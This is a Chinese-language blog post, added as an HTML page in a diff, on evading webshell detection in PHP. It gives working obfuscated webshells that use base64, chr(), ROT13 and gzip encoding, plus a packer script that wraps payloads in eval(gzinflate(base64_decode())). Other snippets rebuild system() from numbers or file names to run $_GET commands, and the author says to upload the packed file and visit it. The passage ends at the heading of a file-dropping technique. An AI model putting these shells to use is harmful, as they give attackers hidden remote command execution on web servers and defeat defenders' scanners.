@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>php_webshell_bypass |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-php-webshell"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  php_webshell_bypass
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/03/21/php-webshell/" class="article-date">
+  <time datetime="2024-03-21T01:12:30.000Z" itemprop="datePublished">2024-03-21</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/phpwebsehll/">phpwebsehll</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">18 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="参考自"><a href="#参考自" class="headerlink" title="参考自"></a>参考自</h2><p>曾师傅博客：<a target="_blank" rel="noopener" href="https://blog.zgsec.cn/">https://blog.zgsec.cn/</a></p>
+<p>曾师傅分享的php_webshell_bypass技巧</p>
+<h3 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h3><h4 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h4><ol>
+<li>统计内容：以结合字符黑名单和函数黑名单或者其他特征列表（例如代码片段的Hash特征表），之后通过对文件信息熵、元字符、特殊字符串频率等统计方式发现WebShell。</li>
+<li>机器学习，给AI喂数据，总结一些webshell特征库，去检测</li>
+<li>动态监控(沙箱)，有脚本执行，就去监控(hook)其中的危险函数，如果有调用过程就会进行阻止</li>
+</ol>
+<h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>1.eval不算做一个函数，所以不能拼接、混淆来执行，只能明文写入</p>
+<p>2.php7中 assert也类似于eval的处境了</p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h3 id="0x01-编码绕过"><a href="#0x01-编码绕过" class="headerlink" title="0x01 编码绕过"></a>0x01 编码绕过</h3><p>你比如把危险函数进行编码赋值给一个变量，再使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$er</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;system的base64编码&quot;</span>)</span><br><span class="line">  <span class="variable">$er</span>(<span class="variable">$POST</span>[asdas]);<span class="comment">//system($POST[asdas])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ascii</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_uU</span>=<span class="title function_ invoke__">chr</span>(<span class="number">99</span>).<span class="title function_ invoke__">chr</span>(<span class="number">104</span>).<span class="title function_ invoke__">chr</span>(<span class="number">114</span>); <span class="comment">//$_uU=chr</span></span><br><span class="line"><span class="variable">$_cC</span>=<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">118</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">108</span>).<span class="variable">$_uU</span>(<span class="number">40</span>).<span class="variable">$_uU</span>(<span class="number">36</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">80</span>).<span class="variable">$_uU</span>(<span class="number">79</span>).<span class="variable">$_uU</span>(<span class="number">83</span>).<span class="variable">$_uU</span>(<span class="number">84</span>).<span class="variable">$_uU</span>(<span class="number">91</span>).<span class="variable">$_uU</span>(<span class="number">49</span>).<span class="variable">$_uU</span>(<span class="number">93</span>).<span class="variable">$_uU</span>(<span class="number">41</span>).<span class="variable">$_uU</span>(<span class="number">59</span>);<span class="comment">//$_cC=eval($_POST[1]);</span></span><br><span class="line"><span class="variable">$_fF</span>=<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">114</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">102</span>).<span class="variable">$_uU</span>(<span class="number">117</span>).<span class="variable">$_uU</span>(<span class="number">110</span>).<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">105</span>).<span class="variable">$_uU</span>(<span class="number">111</span>).<span class="variable">$_uU</span>(<span class="number">110</span>);<span class="comment">//$_fF=create_function</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_fF</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$_cC</span>); <span class="comment">//$_=create_function(&quot;&quot;,eval($_POST[1]);)</span></span><br><span class="line">@<span class="variable">$_</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROT13编码</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;flfgrz&#x27;</span>); <span class="comment">//解密后为system高危函数$f($_POST[&#x27;aabyss&#x27;]); //system($_POST[&#x27;aabyss&#x27;]);</span></span><br></pre></td></tr></table></figure>
+
+<p>可以采取更冷门的编码方式、或者自定义加密函数进行绕过</p>
+<h4 id="gzip压缩加密"><a href="#gzip压缩加密" class="headerlink" title="gzip压缩加密"></a>gzip压缩加密</h4><p>vscode使用php服务 <a target="_blank" rel="noopener" href="https://blog.csdn.net/Y2ANGAO/article/details/124211658">https://blog.csdn.net/Y2ANGAO/article/details/124211658</a></p>
+<h5 id="0x01-简单的gzip-base64"><a href="#0x01-简单的gzip-base64" class="headerlink" title="0x01.简单的gzip+base64"></a>0x01.简单的gzip+base64</h5><p>gzdeflate用来压缩文件或者字符串</p>
+<p>加密php编写：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*来自https://blog.zgsec.cn/archives/147.html */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode_file_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">   <span class="comment"># $type=strtolower(substr(strrchr($filename,&#x27;.&#x27;),1));</span></span><br><span class="line">   <span class="comment"># if(&#x27;php&#x27;==$type &amp;&amp; is_file($filename) &amp;&amp; is_writable($filename)) &#123;</span></span><br><span class="line">        <span class="comment">// 如果是PHP文件 并且可写 则进行压缩编码</span></span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="comment">// 判断文件是否已经被编码处理</span></span><br><span class="line">       <span class="comment"># $pos = strpos($contents,&#x27;123qianzhui&#x27;);</span></span><br><span class="line">      <span class="comment">#  if(false === $pos || $pos&gt;100) &#123;</span></span><br><span class="line">            <span class="comment">// 去除PHP文件注释和空白，减少文件大小</span></span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="comment">// 去除PHP头部和尾部标识</span></span><br><span class="line">            <span class="variable">$headerPos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&#x27;&lt;?php&#x27;</span>);</span><br><span class="line">            <span class="variable">$footerPos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$contents</span>,<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="variable">$headerPos</span>+<span class="number">5</span>,<span class="variable">$footerPos</span>-<span class="variable">$headerPos</span>);</span><br><span class="line">            <span class="variable">$encode</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">gzdeflate</span>(<span class="variable">$contents</span>));</span><br><span class="line">            <span class="comment">// 开始编码</span></span><br><span class="line">            <span class="variable">$encode</span> = <span class="string">&#x27;&lt;?php&#x27;</span>.<span class="string">&quot; /*123qianzhui*/\neval(gzinflate(base64_decode(&#x27;&quot;</span>.<span class="variable">$encode</span>.<span class="string">&quot;&#x27;))); \n?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$encode</span>);</span><br><span class="line">       <span class="comment"># &#125;</span></span><br><span class="line">   <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment">#return false;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用函数</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;E:\VS project\py\Debug\test.php&#x27;</span>;</span><br><span class="line"><span class="comment">//这里填入需要加密的原始PHP文件名</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">encode_file_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test.php放自己的payload，加密后上传，访问即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行完加密后变成，这个就是我们最终要用的木马</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*123qianzhui*/</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;4+VKTc7IVyjIKMjMS8vX0LRWsLcDAA==&#x27;</span>))); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接上传加密后的test.php访问即可</p>
+<p>解密过程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*来自https://blog.zgsec.cn/archives/147.html */</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//放入已经加密的PHP内容</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eval(gzinflate(base64_decode(&#x27;4+VKTc7IVyjIKMjMS8vX0LRWsLcDAA==&#x27;)));&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decodephp</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$max_level</span> = <span class="number">300</span>; <span class="comment">//最大层数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$max_level</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;echo&#x27;</span>, <span class="variable">$a</span>));</span><br><span class="line">        <span class="variable">$a</span> = <span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$a</span>, <span class="string">&#x27;eval(gzinflate(base64_decode&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里注意要加htmlspecialchars，我看好多文章没写(但其实不加也无所谓)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">decodephp</span>(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="0x02-进阶的gzip-base64"><a href="#0x02-进阶的gzip-base64" class="headerlink" title="0x02.进阶的gzip+base64"></a>0x02.进阶的gzip+base64</h5><p>加密如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*来自https://blog.zgsec.cn/archives/147.html */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iJG</span>(<span class="params"><span class="variable">$BHM</span></span>) </span>&#123; </span><br><span class="line"><span class="variable">$BHM</span>=<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$BHM</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$BHM</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$BHM</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$BHM</span>[<span class="variable">$i</span>])-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$BHM</span>;</span><br><span class="line">&#125; <span class="keyword">eval</span>(<span class="title function_ invoke__">iJG</span>(<span class="string">&quot;U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>基本原理是：先解开base64，再进行gzinflate，之后循环为每一位重新赋值</p>
+<p>解密看看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*来自https://blog.zgsec.cn/archives/147.html */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iJG</span>(<span class="params"><span class="variable">$BHM</span></span>) </span>&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;base64解码：&quot;</span>.<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$BHM</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$BHM</span>=<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$BHM</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;gzip膨胀：&quot;</span>.<span class="variable">$BHM</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$BHM</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$BHM</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$BHM</span>[<span class="variable">$i</span>])-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$BHM</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;解密后为：&quot;</span>.<span class="title function_ invoke__">iJG</span>(<span class="string">&quot;U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A&quot;</span>));</span><br><span class="line"><span class="comment">//eval(iJG(&quot;U1QEAm4QkVaelKupmhAYEBIao1yYVFJSUVCcqhynZcPtYA8A&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20240320221944083-1711026391704-3.png"></p>
+<p>vscode的连不了，貌似是3000端口，看似打开，又没打开，简称如开</p>
+<p><img src="/../../../Typora/img111/image-20240320223257653-1711026391704-7.png" alt="放到小皮里去连接"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zgsec.cn/archives/147.html">https://blog.zgsec.cn/archives/147.html</a></p>
+<h3 id="0x02-字符串混淆处理"><a href="#0x02-字符串混淆处理" class="headerlink" title="0x02 字符串混淆处理"></a>0x02 字符串混淆处理</h3><h5 id="a-巧取特定字符"><a href="#a-巧取特定字符" class="headerlink" title="a.巧取特定字符"></a>a.巧取特定字符</h5><p>无非是拼接、替换，绕过WAF的正则、处理逻辑等</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confusion</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">    ;<span class="variable">$tmp</span> = <span class="string">&quot;&quot;</span>;<span class="keyword">while</span> (<span class="variable">$a</span>&gt;<span class="number">10</span>) &#123;<span class="variable">$tmp</span> .= <span class="variable">$s</span>[<span class="variable">$a</span>%<span class="number">10</span>];</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$a</span>/<span class="number">10</span>;&#125;<span class="keyword">return</span> <span class="variable">$tmp</span>.<span class="variable">$s</span>[<span class="variable">$a</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">confusion</span>(<span class="number">976534</span>); <span class="comment">//sysTem（高危函数）</span></span><br><span class="line">    <span class="comment">#$f($_POST[&#x27;aabyss&#x27;]); //sysTem($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line">    <span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="b-巧用文件名"><a href="#b-巧用文件名" class="headerlink" title="b.巧用文件名"></a>b.巧用文件名</h5><p>从文件名取出来数字即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confusion</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$a</span>&gt;<span class="number">10</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="variable">$s</span>[<span class="variable">$a</span>%<span class="number">10</span>];<span class="variable">$a</span> = <span class="variable">$a</span>/<span class="number">10</span>;</span><br><span class="line">    &#125;<span class="keyword">return</span> <span class="variable">$tmp</span>.<span class="variable">$s</span>[<span class="variable">$a</span>];</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">confusion</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="keyword">__FILE__</span>, -<span class="number">10</span>, <span class="number">6</span>))); <span class="comment">//sysTem（高危函数）</span></span><br><span class="line">    <span class="comment">//__FILE__为976534.php </span></span><br><span class="line">    <span class="comment">#获取文件名倒数第十个数字开始的连续6个字符</span></span><br><span class="line">    <span class="comment">//substr(__FILE__, -10, 6);即从文件名中提取出976534</span></span><br><span class="line">   <span class="comment">// confusion(intval(976534));//即输出了sysTem（高危函数），拼接即可</span></span><br><span class="line">    <span class="comment">#$f($_POST[&#x27;aabyss&#x27;]); //sysTem($_POST[&#x27;aabyss&#x27;]);</span></span><br><span class="line">    <span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yly&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="c-特殊字符串-间接变量"><a href="#c-特殊字符串-间接变量" class="headerlink" title="c.特殊字符串+间接变量"></a>c.特殊字符串+间接变量</h5><p>主要是回车、换行、null、特殊字符(空白等)绕过正则</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">#$$f = $_POST[&#x27;aabyss&#x27;];</span></span><br><span class="line"><span class="variable">$$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yly&#x27;</span>];<span class="comment">//即$hello=$_GET[&#x27;yly&#x27;]</span></span><br><span class="line"><span class="comment">#eval(``.$hello); //这里反引号我解析不了</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(` `.<span class="variable">$hello</span>);<span class="comment">//中间有空格，system是可以的</span></span><br><span class="line"><span class="comment">#eval(` `.$hello);//这个命令我用了php5.x版本的也报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果再配合第一个的话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confusion</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s</span> = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>]</span><br><span class="line">    ;<span class="variable">$tmp</span> = <span class="string">&quot;&quot;</span>;<span class="keyword">while</span> (<span class="variable">$a</span>&gt;<span class="number">10</span>) &#123;<span class="variable">$tmp</span> .= <span class="variable">$s</span>[<span class="variable">$a</span>%<span class="number">10</span>];</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$a</span>/<span class="number">10</span>;&#125;<span class="keyword">return</span> <span class="variable">$tmp</span>.<span class="variable">$s</span>[<span class="variable">$a</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$x</span> = <span class="title function_ invoke__">confusion</span>(<span class="number">976534</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">#$$f = $_POST[&#x27;aabyss&#x27;];</span></span><br><span class="line"><span class="variable">$$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yly&#x27;</span>];<span class="comment">//即$hello=$_GET[&#x27;yly&#x27;]</span></span><br><span class="line"><span class="comment">#eval(``.$hello); //这里反引号我解析不了</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>(` `.<span class="variable">$hello</span>);<span class="comment">//中间有空格，system是可以的</span></span><br><span class="line"><span class="comment">#eval(` `.$hello);//这个命令我用了php5.x版本的也报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-生成新文件绕过"><a href="#0x03-生成新文件绕过" class="headerlink" title="0x03 生成新文件绕过"></a>0x03 生成新文件绕过</h3><p>这个原理就是上传一个php文件，通过它在同目录下去生成一个恶意php，访问达到目的</p>
